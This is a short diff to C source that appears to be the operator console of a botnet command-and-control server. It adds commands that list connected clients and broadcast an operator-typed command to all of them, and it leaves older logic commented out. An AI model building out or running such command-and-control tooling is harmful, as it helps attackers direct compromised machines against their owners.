@@ -58,6 +58,7 @@ int main(void)
     pthread_create(&thread2, NULL, bot_command, (void *)args);
 
     pthread_join(thread1, NULL);
+    pthread_join(thread2, NULL);
 
     // Exit
     return 0;
@@ -152,18 +153,58 @@ void* bot_command(void *args_main)
     printf(">> ");
     fgets(data, sizeof(data), stdin);
     data[strcspn(data, "\n")] = 0;
+    if (strcmp(data, "count") == 0) {
+      printf("fd count: %d\n", args->fd_count);
+    }
+    if (strcmp(data, "fds") == 0) {
+      for(int i = 0; i < args->fd_count; i++){
+        printf("client %d is on fd %d\n", i, args->pfds[i].fd);
+      }
+    }
     if (strcmp(data, "all") == 0) {
       printf("[+] Enter command: ");
       fgets(data, sizeof(data), stdin);
       data[strcspn(data, "\n")] = 0;
-      if (strcmp(data, "exit") == 0) {
-          exit(0);
+      for(int i = 1; i < args->fd_count; i++){
+        send(args->pfds[i].fd, data, sizeof(data), 0);
       }
+    }
+
+
+      /* fgets(data, sizeof(data), stdin);
+      data[strcspn(data, "\n")] = 0;
+
       pthread_mutex_lock(&mutex);
       //for(int j = 1; j < args->fd_count; j++) {
           send(args->pfds[2].fd, data, sizeof(data), 0);
       //}
-      pthread_mutex_unlock(&mutex);
-    }
+      pthread_mutex_unlock(&mutex); */
   }
 }
+
+
+
+
+
+/*
+while(1)
+{
+  printf("[+] Send to one client or to all?\n");
+  printf(">> ");
+  fgets(data, sizeof(data), stdin);
+  data[strcspn(data, "\n")] = 0;
+  if (strcmp(data, "all") == 0) {
+    printf("[+] Enter command: ");
+    fgets(data, sizeof(data), stdin);
+    data[strcspn(data, "\n")] = 0;
+    if (strcmp(data, "exit") == 0) {
+        exit(0);
+    }
+    pthread_mutex_lock(&mutex);
+    //for(int j = 1; j < args->fd_count; j++) {
+        send(args->pfds[2].fd, data, sizeof(data), 0);
+    //}
+    pthread_mutex_unlock(&mutex);
+  }
+}
+*/
